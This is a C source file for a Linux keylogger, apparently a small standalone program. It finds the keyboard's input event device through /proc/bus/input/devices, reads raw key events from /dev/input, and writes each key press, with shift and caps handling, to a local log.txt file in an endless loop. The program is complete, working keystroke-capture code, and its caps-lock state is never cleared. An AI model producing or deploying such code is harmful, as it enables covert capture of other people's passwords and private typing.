#include <stdio.h>
#include <string.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include "key_table.h"

#define N 10000

int str_keyboard(char *s) {
    return \
        s[0] == 'k' && s[1] == 'e' && s[2] == 'y' && \
        s[3] == 'b' && s[4] == 'o' && s[5] == 'a' && s[6] == 'r' && s[7] == 'd';
}

int str_event(char *s) {
    return \
        s[0] == 'e' && s[1] == 'v' && s[2] == 'e' && s[3] == 'n' && s[4] == 't';
}

char* get_event_name() {
    static char buf[N];
    int fd = open("/proc/bus/input/devices", O_RDONLY);
    read(fd, buf, N);
    int found = 0;
    for(int i = 0; i < N; i++) {
        if(str_keyboard(buf + i)) {
            found = 1;
            i += 7;
            continue;
        }
        if(found && str_event(buf + i)) {
            char *t = buf + i;
            while(*t != 32) t++;
            *t = 0;
            return buf + i;
        }
    }
    return NULL;
}

int is_code_alpha(int code) {
    return \
        (code >= KEY_Q && code <= KEY_P) || \
        (code >= KEY_A && code <= KEY_L) || \
        (code >= KEY_Z && code <= KEY_M);

}

int main() {
    static char dev_path[100];
    char *event_name = get_event_name();
    if(event_name == NULL) {
        puts("Device event for keyboard not Found!");
        return 1;
    }
    sprintf(dev_path, "/dev/input/%s", event_name);
    printf("Find devices: %s\n", dev_path);
    int fd = open(dev_path, O_RDONLY);
    if(fd < 0) {
        printf("Unable to open %s!\n", dev_path);
        printf("Try to run with `sudo' ?");
        return 1;
    }
    FILE *fh = fopen("log.txt", "w");
    struct input_event ev;
    int is_shift_pressed = 0, is_caps_on = 0;
    while(1) {
        int siz = read(fd, &ev, sizeof(struct input_event));
        if(ev.type != EV_KEY) continue;
        if(ev.value == 0) {
            // release
            if(ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                is_shift_pressed = 0;
                continue;
            }
        } else {
            // press
            // special keys
            if(ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                is_shift_pressed = 1;
            }
            if(ev.code == KEY_CAPSLOCK) {
                is_caps_on = 1;
            }
            if(ev.code == KEY_FN) {
                fprintf(fh, "Key [FN] pressed.\n");
                fflush(fh);
                continue;
            }
            if(ev.code > KEY_DELETE) {
                fprintf(fh, "Key [Unknown] pressed.\n");
                fflush(fh);
                continue;
            }
            // normal keys
            if(is_code_alpha(ev.code)) {
                int rv = is_shift_pressed ^ is_caps_on;
                fprintf(fh, "Key %s pressed.\n", rv ? \
                    caps_scancode_to_ascii[ev.code] : \
                    scancode_to_ascii[ev.code]);
                fflush(fh);
                continue;
            }
            fprintf(fh, "Key %s pressed.\n", is_shift_pressed ? \
                shift_scancode_to_ascii[ev.code] : \
                scancode_to_ascii[ev.code]);
            fflush(fh);
        }
    }
    close(fd);
    fclose(fh);
    return 0;
}